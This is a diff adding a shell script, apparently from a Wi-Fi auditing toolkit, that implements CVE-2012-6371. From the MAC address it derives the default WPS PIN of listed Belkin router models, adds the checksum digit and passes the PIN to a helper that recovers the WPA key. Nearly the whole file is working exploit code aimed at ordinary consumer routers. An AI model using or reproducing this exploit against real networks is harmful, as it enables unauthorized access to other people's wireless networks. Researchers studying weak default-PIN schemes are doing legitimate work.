@@ -1,0 +1,48 @@
+#!/bin/sh
+# thanks to http://ednolo.alumnos.upv.es/?p=1295G
+# for the PoC code 
+# Calculates the default WPS pin of Belkin Routers and returns the WPA key
+#
+# Implementation of CVE-2012-6371
+
+# works :
+# Belkin_N+_XXXXXX   00:22:75:XX:XX:XX    F5D8235-4 v1000
+# belkin.XXX         00:1C:DF:XX:XX:XX    F5D8231-4 v5000
+# belkin.XXX         09:86:3B:XX:XX:XX    F9K1104   v1000
+
+cd $(dirname $(readlink -f $0))
+. ../lib/core
+. ../lib/wps
+parse_args $@
+
+MAC=$(printf "%s" $2| sed 's/://g')
+if [ ${#MAC} -ne 12 ] ;then
+    echo "MAC malformed"
+    exit 1
+fi
+VENDOR_MAC=${MAC:0:6}
+PRIVATE_MAC=${MAC:6:12}
+if ! [ $VENDOR_MAC == "002275" -o $VENDOR_MAC == "001CDF" -o $VENDOR_MAC == "09863B" ] ;then
+    echo "VENDOR MAC $VENDOR_MAC not affected"
+    exit 1
+fi
+
+calc_belkin(){
+    PRIVATE_MAC=${1}
+
+    p=$((0x$PRIVATE_MAC % 10000000))
+    wps_pin_checksum(){
+        pin=$1
+        accum=0
+        while [ $pin -ne 0 ];do
+            accum=$((accum + (3 * (pin % 10)) ))
+            pin=$((pin/10))
+            accum=$((accum + pin %10 ))
+            pin=$((pin/10))
+        done
+        echo $(( (10 - accum % 10) % 10))
+    }
+    printf "%07d%d" $p $(wps_pin_checksum $p)
+    return 0
+}
+try_wps_pin $@ $(calc_belkin ${PRIVATE_MAC})
